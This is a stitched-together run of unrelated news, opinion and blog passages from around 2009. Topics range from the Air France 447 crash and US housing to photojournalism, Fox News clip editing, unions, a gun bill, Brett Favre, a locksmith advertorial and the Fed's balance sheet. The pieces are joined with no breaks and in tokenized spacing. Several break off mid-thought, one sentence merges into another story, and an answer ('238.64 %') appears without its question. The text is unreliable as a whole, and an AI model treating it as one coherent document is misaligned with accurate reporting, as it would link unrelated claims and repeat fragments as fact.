The rate for a 30 - year mortgage was well below 5 % during the month , which encouraged buyers and drove up demand .
Zandi is hopeful that the market is stabilizing .
" It feels like the cycle is winding down , " he said .
" I think it depends on how well the mortgage modification plan will work and I 'm guessing it will work reasonably well . "
One possible scenario , according to Shiller , is that home price declines end and then nothing happens for several years , the " L - shaped " recovery .
" Then , we can stop talking about home prices and get onto more interesting topics , " he said .
FERNANDO DE NORONHA , Brazil ( Reuters ) - Brazilian search crews fished the first debris from a crashed Air France flight out of choppy Atlantic waters on Thursday amid concern the plane may have flown through a storm at the wrong speed .
Citing sources close to the inquiry , French newspaper Le Monde said the plane ’s maker , Airbus , was preparing to issue a recommendation advising airlines that fly the A330 of optimal speeds during poor weather conditions .
Airbus declined to comment but France ’s BEA air accident investigation agency warned against speculating over the cause of the accident given that only two facts had been established .
They included the presence of stormy weather conditions close to the plane ’s expected route and the fact various speeds measured on the basis of automatic messages sent by the plane showed “ incoherence , ” suggesting they did not tally .
While Le Monde said the airliner was flying “ at the wrong speed ” in the early hours of Monday just before the disaster , it drew no link with the final sequences of automated messages sent by the jet .
Pilots often slow down when entering stormy zones to avoid damaging the aircraft , but reducing speed too much can cause an aircraft to stall .
A Brazilian Lynx helicopter picked up a luggage pallet and two buoys before returning to a navy frigate sent to the area to help with the rescue , Brazil ’s air force said .
The crews also found yellow , brown and white items that appeared to come from the inside of the aircraft .
Searchers have found several debris sites spread out over 90 km ( 56 miles ) , a sign the plane may have broken up in the air .
The Air France A330 - 200 was en route from Rio de Janeiro to Paris when it plunged into the Atlantic four hours into its flight .
Air France has told relatives of the 228 people on board there is no hope of survivors .
Experts have been mystified by the sudden crash of a modern airliner operated by three experienced pilots , with theories on the cause ranging from extreme turbulence to a loss of cabin pressure to possible computer system faults .
Three Brazilian navy ships are searching the area about 1,100 km ( 680 miles ) northeast of Brazil ’s coast , but have yet to reach the debris .
Searchers have seen no traces of bodies .
“ We were giving priority to finding bodies , but as we have n’t found any we have time to collect the debris , ” Air Force Brigadier Ramon Borges Cardoso told reporters in the northern coastal city of Recife .
“ If we find bodies , we will stop everything and bring them here . ”

From a base on the islands of Fernando de Noronha , a sparsely populated volcanic archipelago 370 km ( 230 miles ) from Brazil ’s coast , 11 air force planes have been carrying out search operations over a 6,000 sq km ( 2,300 sq mile ) area .
Several hundred relatives and friends of the passengers crammed into the Candelaria church in Rio on Thursday morning , crying and hugging each other .
“ Those who are missing are here in our hearts and in our memories , ” French Foreign Minister Bernard Kouchner told them .

SUDDEN , BRUTAL CRASH
Brazil ’s defense minister Nelson Jobim said on Wednesday the presence of long fuel slicks in the water could mean the crash was not caused by an explosion , which would have burned the fuel .
Jobim ’s remarks undercut speculation that a bomb may have blown up the plane in mid-air , a possibility intelligence services and security analysts say seems unlikely .
French authorities have not excluded the possibility of foul play .
With the flight data and voice recorders probably at the bottom of the ocean , officials are worried they may never discover what caused AF Flight 447 to drop out of the sky .
The crash appears to have been sudden and brutal .
Spanish newspaper El Mundo said a transatlantic airline pilot reported seeing a flash of white light at the same time the Air France flight disappeared .
“ Suddenly we saw in the distance a strong , intense flash of white light that took a downward , vertical trajectory and disappeared in six seconds , ” the pilot of an Air Comet flight from Lima to Madrid told his company , the newspaper reported .
The plane sent a series of automatic messages in the space of four minutes indicating system failures and a sharp dive , specialist magazine Aviation Herald said on its Web site , citing Air France sources .
The messages started arriving at 0210 GMT on Monday ( 10:10 p.m. EDT on Sunday ) , indicating the automatic pilot had been disengaged , and ended at 0214 with an advisory that the cabin was at “ vertical speed . ”
A problem with the aircraft ’s speed could be part of the puzzle , but one expert said it was doubtful whether any of the plane ’s flight readings were accurate in its final moments .
“ Was the airplane going slowly or was it indicating that it was going slowly ?
There ’s a big difference . ” said John Cox , President of Washington aviation consulting firm Safety Operating Systems .
The answer is 238.64 % .
A good way of approximating is to use the rule of 70 .
If x is the growth rate then the doubling time is approximately 70 /x .
Thus , with a growth rate of 5 % we expect a doubling ( 100 % increase ) in 14 years and a quadrupling in 28 years so a bit more than a tripling in 25 years ( 200 % increase ) is a good guess .
The Conference Board of Canada , a Canadian think - tank that was caught regurgitating a US lobby - group 's press materials in a tax - funded report on the Digital Economy , has withdrawn its copyright - related reports , stating " these reports did not follow the high quality research standards of The Conference Board of Canada . "
This is a major climb - down for the Conference Board , who refused to admit any wrongdoing after being caught plagiarizing materials from US copyright lobbyists , the International Intellectual Property Alliance , and even stood pat after it was revealed that they 'd discarded and suppressed contradictory reports written by their own experts .

14 year - old Spanish bullfighter was critically injured in Mexico .
Jairo Miguel suffered severe injuries after being gored in the thorax and dragged by the bull .
The goring missed his heart by just two centimetres , but split one of his lungs in two .
Ten years ago I started my own business .
At that time I felt this was the best decision ever in my entire life .
Ten years after I still feel the same with all my heart .
Having your own business is one of the most challenging situations in which you can put yourself .
And I ’m not talking only about the financial part of a business .
Most of the crash - courses on how to start your own business have a strong focus on the profit and financial facts .
They are all selling you methods to reach profit quickly .
And , to some extent , those are good and proven methods , but they have nothing to do with the pre-conscious choice of having a business .
Those profit making courses are assuming you already took the decision .
In fact , having a business is not at all about profit .
If you are serious about it , and if it proves to be a good and mature choice , you will have to face the profit challenges sooner or later .
It ’s in a business nature to have profit in order to survive .
But making profit the most important part in having a business is just wrong .
It ’s something that you deal with months or years after you started your business for real .
The choice of starting your own business is more like an adventure than a spreadsheet .
It ’s more about risk taking than financial security .
It ’s more about personal development and growth than bank statements and material wealth .
In today ’s post I ’ll share some thoughts about how I decided to start my own business , and how this decision still benefit me after ten years .
The Drive
I was 29 year old when I started my own business .
Until that age I was mostly dragging around , living by talking out loud ( really , I was working as an anchor man on FM radios , I have a pretty radiophonic voice ) and never making plans for tomorrow .
For several years in a row I was mostly drinking my evenings out with the same people , borrowing their misery and trying to find reasons to wake up the next day .
But around that age something started to change in me .
Never knew how to define that .
It was a drive for deep , fundamental and meaningful change .
And that desire for change was spreading over all areas of my life : personal , as well as professional .
To make a long story short , it was a mix of bad personal choices and amazingly risky professional decisions that lead to the final result : setting up my own company .
I wo n’t go into technical details about how and when exactly I did it .
I want to focus more on the inner reasons that took me there .
And those inner reasons are made of only three main qualities : courage , curiosity and enthusiasm .
All three qualities mixed together created a powerful drive for change .
Courage
The definition of courage is for me the ability to change at any given point a status - quo without hesitation and with all available energy .
Regardless of the overall context , of course .
And the overall context at that time was simply horrible for starting a business .
And when I say horrible , I mean it .
Cash was simply intangible as a resource , you could n’t borrow money from the bank without accepting an interest higher than 80 % .
Yes , higher than 80 % , which means credit was simply prohibitive .
Cash was the smallest problem , by the way .
You had to face corruption , lack of qualified people – which made me to learn a lot of different skills , and an almost desert market for online products .
Basically , you were far better at that time if you could secure a job and get on with it .
But against all odds I started this business .
And my very first project was worth over 20.000 USD , an amount who let me finance my activities for the first year , until I set up a qualified team and a location .
Not even my associates believed me at that time , until they saw the contract .
I started the business as an act of conscious change , despite of an unfriendly context .
Curiosity
Curiosity as a quality is often underrated .
It ’s amazing how useful curiosity is for a balanced life and for constant growth .
I think boredom is a chronic imbalance with curiosity .
I also think curiosity is somehow related to our ability to create and maintain happiness .
Although I was working as an anchor man – well , ok , I was climbing on the hierarchy and go through all the levels of a FM radio diagram , up to the position of program manager – well , besides that , I was constantly expressing interest in other , completely unrelated areas .
I remember that I was fascinated by fractals at that time .
I was also into computers and internet , and bought my first books on programming .
I started to learn Borland C++ on the bus , while going at the radio .
I was literally obsessed with learning new stuff .
And out of curiosity I decided to have a business in the online field .
At that time online was something yet to be defined , of course , nobody could predict in 1999 that we will actually have the Internet as we have it today .
But I had this unstoppable urge to do something in that field and learn as much as I can .
I started the business so I can learn more of what I liked .
Enthusiasm
The first three years of my company I worked 16 hours a day , no weekends .
I actually worked more than 1000 days in a row , and I can tell you in all honesty that I ’ve never been tired .
Not a single day .
I was fueled by enthusiasm .
Enthusiasm is such a gift .
It ’s a state of your conscience in which you are channeling a lot more energy than usual .
But enthusiasm is also a function of what you like and do n’t like .
You ca n’t really get excited about something you do n’t like , and then spend 16 hours a day , 1000 days in a row on it .
You simply can’t .
I was doing something that I liked , soaking myself in a completely new field of activity .
I was courageously spending each day looking for ideas , people or resources in order to build something that I truly believed in .
Of course I was literally exhaling endorphins .
If I did n’t have enthusiasm I could n’t make it over the first three years .
And my enthusiasm was a consequence of my choices : I was doing something that I loved and with courage and determination .
I finally found something that put me in that enthusiasm state and let me there for good .
I started my own business because I was so excited to do something I really loved to do .
***
As you can see , my drive to start my own business had nothing to do with money .
There was n’t any single mention of the money and profits in my first 4 - 5 months .
I was so confident that things will go well that I simply overlooked this part .
And for that period , that was a very clever thing to do , because it allowed me to focus on other , more important areas .
Later on , I had some periods in which I overlooked the money flow the same way , but with some disastrous consequences .
Maybe I ’ll blog about those times some day .
Having a business is not at all a pinky lifestyle and every mistake develop a strange tendency to blow everything away .
Starting your own business is not a matter of money and profit .
It ’s really a matter of courage , curiosity and enthusiasm .
Whenever you mix those three fundamental qualities of your being , something big happens in your life .
In my life that mix gave birth to my own business .
In your life , that mix can manifest something different , but it will always challenge your core for growth and personal development .
Maybe it will be your relationship that needs courage , curiosity and enthusiasm , maybe it will be your social life .
Whatever field it will chose to manifest in , the alignment of courage , curiosity and enthusiasm will change your life for good .
The Catch
I ’m sure you already learned by now that “ starting your own business ” has nothing to do with bank statements and formal certificates of incorporation .
It ’s all about creating value out of genuine curiosity , with great courage and backed up with enthusiasm .
You can as well work for somebody else as an employee , but if you do that with courage , curiosity and enthusiasm , it would be like you already started your own business , and your boss is just your most important client .
Way back in 1999 , I wrote an editorial lamenting how difficult it was becoming to pursue a life in photojournalism .
Budgets were being slashed at the newsmagazines for photography , entry - level jobs at newspapers were becoming increasingly difficult to obtain , and once such an internship was secured , it was hard to move up the ladder .
Compared to the glory days of photojournalism in the 1970s , the situation was looking bleak .
As I reread that article recently , I realized that what I was talking about then were some cracks in the dam .
Today , the whole damned dam is gone .
It is difficult not to be concerned by the changes in the industry over the past year .
Newsmagazines are not exempt from these changes .
Time and Newsweek once had an extremely heated and competitive battle each week to get the very best photographers on the big stories of the week .
During the 1982 siege of Beirut , I headed a " delta team " for Time magazine of no less than 10 photographers covering that struggle day in and day out for more than a month .
On a major presidential international trip , there would be at least three or four contract photographers flying with the president , with stringers picked up along the way .
Radio repeaters were set up to coordinate the photographers ' movements .
Advance trips were made by the photographers to chart the story .
The newsmagazines were once the market of choice for photographers and agencies .
Together Time and Newsweek provided the best places to work .
Today , as any photo agency head will tell you , they simply no longer provide the financial support that once kept the business going .
In hopes of saving the brand , Newsweek recently did a complete makeover .
The magazine could no longer compete with the Internet , with decreased readership and lost advertising .
The first thing to go was the news .
According to its editor , Jon Meacham , the intent was to turn Newsweek into a watered down version of The Economist .
The magazine is now too soft .
It is no longer about news .
It does not work .
An editor of The Wall Street Journal said a long time ago , " The great benefit of not using pictures was you do n't need photographers . "
That is becoming truer all the time .
For the most part pictures are certainly gone from the new layout at Newsweek .
Although the June 20th issue featured several spreads of pictures from the protests in Iran to accompany a Fareed Zakaria article , compared to Time 's coverage they seemed to be afterthoughts .
Over at Time , things are not really better .
Pleas by their contract photographers to be sent to Iran in advance of the 30th anniversary of the revolution were rebuffed .
One of Time 's top contract photographers reported that last year he only had three assignments , and that was in an election year .
Meanwhile , things are even worse at newspapers .
Back when the newsmagazines were sending flocks of photographers flying around the globe , the newspapers , funded by more than 20 % profit ratios , were investing heavily in their photo departments .
Papers like The New York Times , The Washington Post , the Chicago Tribune ; and The Dallas Morning News were all vying for the best photojournalists they could find and then they sent them off on long - term projects , which won countless Pulitzer Prizes .
Of course , like all good things , this culture has been torn apart as these papers now struggle to survive .
We all know about papers like the fabled Rocky Mountain News and Seattle Post - Intelligencer , which have folded this year .
The Chicago Tribune Company is in bankruptcy .
Hundreds of photojournalists have been thrown out of what they considered " jobs for life . "
In 1999 , video journalism was only a ray of light on the horizon .
Ten years later , despite the training programs by such organizations as The Platypus Workshop and the National Press Photographers workshops , newspapers that were leading the march into multimedia , such as the Detroit Free Press , are pulling back on those initiatives as they struggle to survive .
The FREEP no longer even makes home deliveries of their paper to the readers .
And the situation is even grimmer in television .
Newsroom budgets are being slashed at networks and affiliates .
Photojournalists who had won prizes for their stations are now pounding the street , but minus those betacams .
Meanwhile , what we looked forward to in 1999 , the emergence of the World Wide Web as a principal news provider , has happened beyond our wildest expectations .
The problem is that the revenue in advertising has not kept up with the Web 's growth .
Although a newspaper
Web site 's unique views can dwarf the print edition 's circulation , the revenue derived from Web advertising is often less than 10 percent of print ads .
Yet , it is this weak stream of revenue that publishers are turning to just to keep their print editions in existence .
What this means is that revenue available to pay visual journalists just is n't there .
However , publishers realize that they must get those advertising dollars up .
There are constant industry meetings as they try to come up with standardization of online ad rates .
But as they sort this out , which eventually they will , many print editions will disappear and major brands will cease publication both in print and on the Web .
So , change has come .
We are in what I am afraid are only the opening moments of an economic adjustment that will affect everyone .
Steve Balmer , the CEO of Microsoft , recently told an audience in Cannes , " I do n't think we are in a recession ; I think we have reset , " he said .
" A recession implies recovery [ to pre-recession levels ] and for planning purposes I do n't think we will .
We have reset and wo n't rebound and re-grow . "
In the meantime , papers like " the old grey lady , " The New York Times , are hanging in there .
They still have the best photo department in the world , in my estimation , and the quality of pictures and video just keeps getting better .
Amidst all of the chatter on Twitter and YouTube during the protests in Iran , there was a lone professional voice reporting from the streets , and that was the Times ' Roger Cohen .
With all other Western media barred from covering the protests , Cohen provided a reliable window into a complex and dangerous story .
His reports were a testimony of the value of papers like the Times .
They paid for him to be there .
Without people like Cohen , the world would be a sorry place .
At the end of the day , whether Time or The New York Times survives is irrelevant .
The real question is , who is going to PAY professional journalists such as Cohen to go to these news scenes ?
Professionals do matter .
If you broke your leg and your choice would be to have your neighbor who had faithfully watched every episode of " ER " set it , or go to a hospital , there is no question what you would do .
In a recent Platypus class , my students asked me , " Why would you be a photojournalist today ? "
I answered , " You have to be crazy . "
I have always considered being crazy as important to a photographer as being curious .
Constitutionally , we thrive on chaos and challenge .
Being a photojournalist is more a calling than a trade .
Those people who will do anything to come back with a story will be out there shooting for a long time .

On The Daily Show last night Jon Stewart mocked FNC ’s Sean Hannity for editing a clip of Obama ’s speech in Cairo last week in order to claim that Obama was giving a voice to the 9/11 sympathizers .
Stewart nailed Hannity for only showing half of Obama ’s sentence .
Check out the video .
Here is the video from Media Matters :

I am not sure whether to laugh or be depressed by the fact that it was The Daily Show that held Hannity accountable , not any other news organization .
It is standard operating procedure for FNC to selectively edit clips to provide a misleading quote .
Does anyone else remember how Fox News edited Al Gore ’s congressional testimony to make it seem like he said that he was making money off of global warming ?
What does it say about the state of American news when the sharpest media critic in the country is the host of a mock news show ?
Fox News can get away with these distortions because no one ever calls them on it .
However when they are called out on it , as CNN ’s Rick Sanchez did with a bogus Bill O’Reilly claim last week , they back down quickly .
If the audiences held the cable news networks to a higher standard , they would not be able to get away with doctoring and editing video .
MSNBC is not even close to FNC on the distortion scale yet , but I think that could easily slip on to that path , if they are n’t careful .
Audiences should demand better , and Jon Stewart should not be one of the few national voices holding people like Sean Hannity accountable .

If the ancient Egyptians had the internet , there would have been 11 plagues in Exodus , with " unreliable DSL " tucked in between the frogs and the lice .
It 's a pain when your DSL goes down , but the bright side is that it gives you a chance to rate yourself on the Internet Dependency Scale .
Just compare your actions to those listed below and you 'll know what sort of pathetic digital symbiont you really are .
Stage 1 Internet Dependency
Immediate reaction :
Check the wires , see if you can steal a neighbor 's Wi -Fi , then get up and do something else .
What you do while waiting for the connection to come back : Read a book , watch a movie , go for a walk .
Is this a trick question ?
If it does n't come back in an hour : Call your service provider , then go back to whatever you were doing .
Stage 2 Internet Dependency :
Immediate reaction :
Try to steal a neighbor 's Wi-Fi .
Walk around the house with your laptop if necessary .
What to do while waiting for the connection to come back :
Watch a movie or something with your laptop close by so you can see if the connection 's back up .
If it does n't come back in an hour :
Call your service provider , then check the connection every half hour just in case it fixes itself .
Stage 3 Internet Dependency :
Immediate reaction :
Try the neighbor 's Wi-Fi trick , including making a few guesses at the passwords of their locked - down networks .
What you do while waiting for the connection to come back :
Try connecting again .
And again .
Try to watch a movie , remember you only watch movies that stream online , go back to your computer and try to connect again .
If it does n't come back in an hour : Call your service provider , then pack up your laptop and head for an internet cafe .
Stage 4 Internet Dependency :
Immediate reaction : Shocked disbelief , followed by a thorough inspection of your network settings , DSL modem , router , Wi-Fi configuration and the state of local radio interference fields .
Then try the neighbor 's Wi -Fi trick .
Then stand and glare at your modem for a while .
What you do while waiting for the connection to come back :
Try connecting again .
And again .
Go down to watch a movie , remember you only watch movies that stream online , go back up and try to connect again .
If it does n't come back in an hour :
Call your service provider , then pack up your main computer and monitor and head to a hotel that offers reliable internet access .
Stage 5 Internet Dependency :
Immediate reaction :
Get up on the roof and point your homemade Wi-Fi antenna at the library 15 blocks over .
If that does n't work , hook your cellular modem up to your laptop .
If that does n't work , pull out your old 56 K modem and log into the dialup service you pay for every month just in case something like this happens .
What you do while waiting for the connection to come back :
Write a long , involved blog post about how your ISP is costing you time , money and / or effort because of its incompetence .
If it does n't come back in an hour : Call your service provider and fire them .
If there are n't any other DSL providers in your area , move .

A blog about Modern Perl , bioinformatics and anything else that I feel like rambling about .
Mr Merrington said he planned to complain to the council about the road A 19 - year - old man had to be rescued after his lower leg became stuck in melted tar on a road outside his house in Greater Manchester .
Graham Merrington 's foot and shin disappeared down the hole as he tried to cross Angleside Avenue in Burnage .
Firefighters cut away the road surface , believed to have melted in the hot weather , to free him on Tuesday night .
He said : " I was in a bit of shock .
You do n't expect to be walking down a road and disappear down a hole . "
Mr Merrington , a catering assistant , was stuck in the hole for more than 40 minutes while the firefighters worked to free his leg .
The road was cordoned off while police , ambulance and fire crews helped him .
He said : " I was taken to hospital for checks after they managed to free me .
" I have badly injured my ankle , torn my ligaments .
The road surface collapsed under the 19 - year - old 's foot " I 'm really upset about it .
I 'm a keen footballer and now I wo n't be able to run for the next six weeks . "
His father , Wilfred , said there had been many problems with the road in the past , which has been repaired several times .
He said : " It 's a disgrace , we need something done - they can't just keep on patching it up .
" I could n't believe it when I saw my son with one leg in the hole , I did tell him he was pretty stupid though . "
Graham Merrington added : " I will be complaining to the council - this road desperately needs sorting or this kind of thing will happen again , it 's not safe . "
A Manchester City Council spokeswoman said : " Further investigation is taking place and we wish Mr Merrington a speedy recovery . "

This year , bomb attacks on coalition troops in Afghanistan have spiked to an all - time high , with 465 in May alone , more than double the number in the same month two years before .
At least 46 American troops have been killed by I.E.D. ’s this year , putting 2009 on track to set a record in the eight - year war .
I.E.D.’s have been even more deadly for Afghan police officers and soldiers .
At the current rate , I.E.D. attacks on Afghan forces could reach 6,000 this year , up from 81 in 2003 , an American military official said .
In early July alone , nine Afghan police officers were killed in two bomb attacks in Logar Province , south of Kabul .
With few paved roads , Afghanistan is even more fertile territory for I.E.D.’s. than Iraq , where hard pavement often forced insurgents to leave bombs in the open .
Not so in Afghanistan , where it is relatively easy to bury a device in a dirt road and cover the tracks .
Even when I.E.D. ’s do not wound or kill troops , the threat restricts and complicates the movements of coalition forces .

American convoys often must wait for bomb - detection teams that move at three miles per hour .
Helicopters are limited , and most troops travel in mine - resistant , ambush - protected vehicles known as MRAPs , which are lumbering and hard to maneuver .
Though heavily armored MRAPs are effective in shielding soldiers from explosions , two turret gunners died recently when one flipped over after hitting I.E.D.’s .
In Britain it was a moment of sober reflection , the 25th anniversary of the start of the miners ' strike , the greatest defeat for the unions in modern times .
Here in the US , by contrast , a long - overdue victory for organised labour may finally be at hand .
Last week the Employee Free Choice Act was introduced in Congress – in the Senate by none other than Ted Kennedy ( below ) , in what might be a last roar of the ailing liberal lion .
But what a roar it would be if the bill went through .
You might think it is a matter of simple justice .
But for employers , it signifies the advent of socialism or worse .
Listen to corporate America , and its allies in the Republican party and right - wing think - tanks , and you 'd imagine the bill is a charter for union tyranny .
It will increase organised labour 's bargaining power , they complain .
Of course it will ; that is the whole point .
Such objections might have merit if America were like pre-Thatcherite Britain , when the unions held government to ransom .
But they do n't .
The US is one of the least unionised Western countries .
Only 12 per cent of the workforce belong to unions , compared with 30 per cent during organised labour 's golden age in the 1940s and 1950s .

Employers point to the legislation 's " card check " clause , whereby if a majority of workers at a company sign cards calling for the establishment of a union , and the process is ratified by the National Labor Relations Board , a union is automatically set up , with the right to negotiate a contract with management .
If the two sides can't reach agreement , a government - appointed arbitrator will impose a contract .
Opponents say the " card check " amounts to a public vote , which would permit intimidation , even violence , against workers who do n't want a union .
Whatever happened to the secret ballot , that foundation stone of American democracy , they ask , ignoring the Act 's provision of a secret ballot , should a majority of employees request one .
Strip away the propaganda , though , and what 's at stake is clear .
The measure finally levels a playing field that has been tilted against organised labour ever since the Founding Fathers – or at least since a Philadelphia judge ruled in 1806 that an attempt by a group of shoemakers to secure a wage increase was an " illegal criminal conspiracy " .
Abraham Lincoln , who extolled the moral superiority of labour over capital , might have been a supporter of unions – but most often the movement struggled against the overwhelming power of the bosses .
The story of Jay Gould , financier , railroad magnate and archetypal " robber baron " , sums up an era .
In 1886 , Gould was confronted by the so - called Great SouthWest Railroad Strike .
Was he worried ?
someone asked .
Not at all , Gould is said to have replied : " I can hire one half of the working class to kill the other half . "
Predictably , the strike failed .
More than a century later , employers still practise intimidation , albeit of a subtler variety .
They can keep outside union organisers off the premises , and fire employees who agitate for unions , at the risk of derisory fines .
Workers are told of the evils of unionised life .
Jobs , they are told , will vanish as costs rise .
If " socialism " comes to the shop floor , the entire company may be forced to relocate to friendlier , even foreign , climes .
Honing these tactics are so - called union - avoidance consultants , " union - busters " as they are better known .
They are masters of stalling , prevarication and generally exploiting every loophole in America 's labour laws .
Yes , the employees may get a secret vote – but to what end ?
According to a recent study , out of 22,000 organising drives at companies between 1999 and 2005 , only one in five succeeded in establishing a union that negotiated a collective contract with employers .
And this despite polls showing that up to 50 million non-unionised workers would join if they could .
The country would benefit as well .
In fact , the health of the unions and that of the national economy move almost as one .
In the 1920s , unions were weak and corporate excesses contributed to the crash that followed .
But in the Depression , membership soared , as the great social programmes of the New Deal helped build the middle class that took wing after the Second World War .
Just as in the 1920s , this latest " boom " has done little for the middle classes .
A declining union movement was mirrored by a concentration of wealth among the rich .
If labour reasserts itself , its extra bargaining muscle should help protect jobs and improve healthcare coverage , the two greatest worries of ordinary Americans .
And , you could argue , with stronger unions worldwide , this crisis might never have happened .
In China , the other contributor to unsustainable global imbalance , a genuinely independent union movement might have forced that government to divert resources into consumption , rather than pile up a surplus that financed America 's ruinous borrowing binge .
But will the bill gain approval ?
A couple of years ago , a similar bill foundered in the Senate .
Back then , George Bush threatened to veto the measure .
Now , President Barack Obama strongly supports it – as well he should , given the money and organisation the unions contributed to his victory .
Several influential Democrats , doubtless prodded by their own corporate donors , are having second thoughts , however , claiming the priority is to put the economy to rights .
But again , that is precisely the point .
If organised labour had had a stronger voice , the US might never have got into this mess in the first place .
HR 2159 is another bill from the anti-gun extremists .
It says ;
“ The Attorney General may deny the transfer of a firearm pursuant to section 922( t ) ( 1 ) ( B ) ( ii ) if the Attorney General determines that the transferee is known ( or appropriately suspected ) to be or have been engaged in conduct constituting , in preparation for , in aid of , or related to terrorism , or providing material support thereof , and the Attorney General has a reasonable belief that the prospective transferee may use a firearm in connection with terrorism . ”
In other words if the Attorney General suspects that you are a terrorist then he can deny you the right to buy a gun .
There is no trial and no due process of law .
So not only does this bill violate the second amendment , it also violates the fifth and sixth amendments .
The author of this bill and the cosponsors all took an oath to support the constitution .
And yet here they are happily proposing to violate it left and right .
In my opinion that should be ample reason for removing them from office .
But there are other troubling aspects to this bill .
If second amendment rights can be removed in this manner what about other rights .
Could your first amendment right of free speech be revoked because you might be using it to conspire with others to commit acts of terrorism ?
Could your fourth amendment right to privacy be taken because you might have something dangerous on your person or your property ?
This bill stinks to high heaven .
All Americans should contact their representatives and tell them this bill must not pass .
I ’m sick of Brett Favre
Hey , did you hear the latest on Brett Favre ?
No ?!
Well apparently his family booked hotel rooms for the same weekend that the Vikings are in Green Bay to play the Packers next season .
So you know what that means right ?!
Absolutely nothing .
Or maybe it means he ’s going to sign with the Vikings .
Or maybe he ’s going to return to the Packers .
Or maybe his family is just outright f’ing with us and decided to book a bunch of hotel rooms for that weekend just for the sheer joy of watching writers everywhere scramble to their computers believing they have the mother of all stories , when in fact they have something about as useful as Jose Canseco without steroids .
( And if that ’s the case then – touche , Favre family . )
Either way – I do n’t care .
I was going to report this Favre - hotel story as I would any other newsworthy item because that ’s my job .
We at TSR try to keep a pulse on what ’s happening in the sports world and unfortunately ( and I do me unfortunately )
Favre remains a hot topic right now .
But I swear , if I have to read or write ( save for this current post ) one more pointless Brett Favre story , then I ’m going to take hostages at the local Wal - Mart and not release them until the media stops torturing us with all this nonsense .
( And do n’t worry – I ’ll let the hostages pick one item out of the store as a keepsake for their troubles …
I ’m not a monster … )
The title of this post should probably read : I ’m sick of the media coverage on Brett Favre , because I know they ’re the ones that are shoving all this coverage down our throats and not him .
But he does n’t escape blame here .
Favre is a media whore .
He loves to be in the spotlight and he ’s become a master of drumming up news whenever the media has become Favre - less for too long .
I do n’t know how he does it , but he manages to make himself relevant every offseason at exactly the right time .
Seriously , what else is there to talk about right now in the NFL ?
Absolutely nothing .
And who is making all the headlines ?
Brett Favre .
How does he do this ?
Only a story involving him , his family and a bunch of reserved hotel rooms in Green Bay could wind up on ESPN ’s home page .
It ’s maddening !
Favre is apparently waiting to make a decision on whether or not he ’s coming back next season until he tests his recently repaired throwing arm .
How convenient .
That means he and the media will have plenty of time to suck the life out of all of us while he waits to make a decision .
In the meantime , I ’ll be down at the local Wal - Mart if any of you need me .
Apparently , the comedienne has no fears about wading back into controversy .
Heeb magazine writes of the photo shoot : " As the ' Domestic Goddess ' dons the famous moustache , transforming
into ' Domestic Goddess Hitler , ' I notice that she ’s beginning to have
fun .
She nails the Fuehrer ’s facial expressions with twisted glee , and
as she takes the burnt gingerbread ' Jew Cookies ' out of the oven it
occurs to me that Barr may be the last celebrity utterly incapable of
giving a fuck — a quality theoretically easy to embody until it ’s time to
face the practical repercussions …
As we wrap up the shoot , Barr puts her Swastika armband , one of
the gingerbread victims and a Polaroid of herself in the costume in a
Ziploc bag , making it look like evidence from some bizarre crime scene .
She plans on bringing it to her 13 - year - old son when she picks him up
from school .
' Maybe this will make my kid like me , ' she says with a
sigh . "
Uh , yikes !
As we ’re here for your safety , we want to be sure you know your best options , no matter where you are in the country .
As one of our own has just moved out to the East coast , we wanted to mention a wonderful Locksmith in Greenville , SC .
For those of you who have never heard of Greenville , it is a beautiful city in the upstate of South Carolina that blends the feel of small city and southern culture .
Although it may be filled with southern hospitality , there are always still threats of break ins or situations where you find yourself locked out of your car or home .
Greenville Lock is a family owned company with over 20 years of experience under their belts .
As we have a similar reputation , we love to recognize the like - minded Locksmiths elsewhere in order to assure you stay well - connected wherever you go .
This company has a full range of services , from automotive , ( including motorcycle ) , to residential , commercial and emergency locksmith services .
When shopping around for your own local locksmiths , we always advise you to check whether or not they offer their services 24/ 7 .
Greenville Lock falls under this umbrella ; they ’re available to you all day , every day so that you never have to be locked out or with a lack of lock security while in the Greenville area .
As timing can be essential in emergency situations , Greenville Lock has a respond time of 15 minutes to ensure your safety in a crunch .
This was one of the main reasons we chose this company to highlight as we understand the potential dangers of having to wait for your locksmith to arrive with help .
We also know many companies are known for their delayed response time , making Greenville Lock one of those companies who is ahead of the game .
One other reason we chose to mention them of all the locksmiths in the area is because they do n’t outsource any of their work .
All of their staff comes directly from their company .
This is important as often times , not even the company who is outsourcing knows the sort of quality you ’ll be receiving .
And in addition to this , outsourcing can make for a more costly experience .
With cost in mind , we ’ve also been told that regardless of what type of service you require , Greenville Lock will take 10 % off of your first service .
As professionals , this is the type of care and service we seek out in companies when looking to recommend a trustworthy locksmith .
If ever you find yourself in South Carolina , we advise you give Greenville Lock a try .
From our own experience , we can safely say they should be your preferred go - to .

Abstract :
Our joint commentary identifies two risk measures — capital ratios and duration — which may be helpful in assessing outcomes of the Fed ’s exit strategy .
We have avoided a fully prepared technical paper and admit that the issues are complex for many of our readers .
To assist readers , we have divided this paper into two parts .
The first part describes the Fed ’s balance sheet in terms that are more commonly understood because they are applied to banks .
Of course , we know that the Fed is not a bank .
We choose the bank as a reference since it is the basis now for many federal programs .
We demonstrate that if the Fed were a bank it would be capital constrained .
In the second and more technical part , we use McCauley duration to measure the risk building in the Fed ’s new balance sheet construction .
We estimate that a 1 % upward parallel shift in the yield curve could render the Fed technically insolvent , if it had to mark to market as a bank is required to do .
If the Fed were a bank and had to live up to the same capital requirements as the institutions it regulates , would it be adequately capitalized ?
This may seem like an absurd question .
After all , a central bank ca n’t go bankrupt .
This is especially true for the Federal Reserve , whose balance sheet historically has been quite simple compared to even that of a moderately sized bank .
Until recently , the Fed ’s assets consisted primarily of US Treasury debt , typically with relatively short maturities .
There was no credit risk and the Fed usually did n’t engage in the buying and selling of those assets .
Rather , it bought and held them to maturity .
This strategy provided the justification for the Fed not to mark those assets to market as interest rates changed .
Open market operations were usually conducted using repurchase agreements ( RP ) and reverse repurchase agreements ( RRP ) , where securities were temporarily sold ( bought ) with an agreement to buy ( sell ) them back to the holder at an agreed - upon price .
These RP transactions were normally done for overnight or for three - day maturities .
They served to decrease or ( increase ) the outstanding supply of Federal Funds , which are the cash reserves banks trade among themselves .
Most importantly , they determined the overnight Fed Funds rate , which was the primary instrument of Fed policy .
They also linked the Treasury securities market to the Federal Funds market , because Treasury securities were used in the RP transactions .
Until the recent crisis , the Fed ’s liability structure consisted mainly of currency held by the public ( Federal Reserve notes ) , deposits held by member banks in the form of excess and required reserves , and deposits of the US Treasury .
Currency accounted for about 90 % of the Fed ’s outstanding liabilities .
Individual notes roll over as they wear out , but they are simply replaced with new ones .
